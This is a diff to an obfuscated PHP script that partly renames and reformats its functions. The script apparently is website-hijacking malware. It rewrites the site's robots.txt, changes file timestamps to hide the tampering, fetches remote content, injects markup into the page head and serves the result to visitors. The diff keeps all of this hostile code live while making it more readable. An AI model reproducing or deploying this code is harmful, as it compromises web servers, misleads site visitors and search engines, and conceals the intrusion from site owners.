@@ -389,12 +389,13 @@ function l1spc7n9($l1WD,$l1Vx,$l1iiC,$l1J){
     return $l1Pt7l;
 }
 
-function l1K5dsu($l1o2ge=''){
-    $l1K5dsu = "$l1o2ge/robots.txt";
-    if(!is_old($l1K5dsu)){
-        @chmod($l1K5dsu);
-        write_file($l1K5dsu,sprintf("User-agent:%s*%sDisallow:",' ',"\n"));
-        change_timestamp($l1K5dsu);
+// input:doc root
+function write_robots_txt($doc_root=''){
+    $robot_filename = "$doc_root/robots.txt";
+    if(!is_old($robot_filename)){
+        @chmod($robot_filename);
+        write_file($robot_filename,sprintf("User-agent:%s*%sDisallow:",' ',"\n"));
+        change_timestamp($robot_filename);
     }
 }
 
@@ -740,7 +741,7 @@ function l1P9LVD($l15tGX=''){
 
     global $l1Qhzk2,$l1go,$l1GRfrF8,$l1fCx83H,$l1VtbCwB,$l1Vvtr,$l135vXS,$l1bhL8Zi,$l1NhADdH,$l1h1,$l1gfDiJL,$l1T2,$l1imRR,$l1GH0rfZ,$l1bS3es,$l1M,$l1o7fR,$l1I,$l1Ni6,$l1Z4k,$l1VQ,$l11ufJ,$l1h,$l1EbALe;
 
-    l1K5dsu($l1I);
+    write_robots_txt($l1I);
 
     if(isset($_SESSION["oO0Oo0OO0"])){
         $l1PwXxhM = $_SESSION["oO0Oo0OO0"];
@@ -1289,8 +1290,8 @@ function l1P9LVD($l15tGX=''){
         return;
     }
 
-    $l1Kr = download($l11ia);
-    $l1Kr=trim($l1Kr);
+    $l1Kr = trim(download($l11ia));
+    //$l1Kr = trim($l1Kr);
 
     if($l1Kr==''){
         header("HTTP/1.1 404 Not Found");
@@ -1316,8 +1317,8 @@ function l1P9LVD($l15tGX=''){
         }
     }
 
-    $l1Kr=str_replace("[##zhang##]","$l1Z4k$l1GRfrF8",$l1Kr);
-    $l1Vvtr=trim($l1Vvtr);
+    $l1Kr = str_replace("[##zhang##]","$l1Z4k$l1GRfrF8",$l1Kr);
+    $l1Vvtr = trim($l1Vvtr);
 
     if($l1Vvtr!=''){
         $l1IRrvcA=array();
@@ -1328,9 +1329,10 @@ function l1P9LVD($l15tGX=''){
             $l1Kr=str_replace("</head>","$l1Vvtr\n</head>",$l1Kr);
         }
     }
-    echo"$l1Kr";
+    echo "$l1Kr";
     exit();
     }
+
     if($index_file != ''){
         echo file_get_contents($index_file);
     }
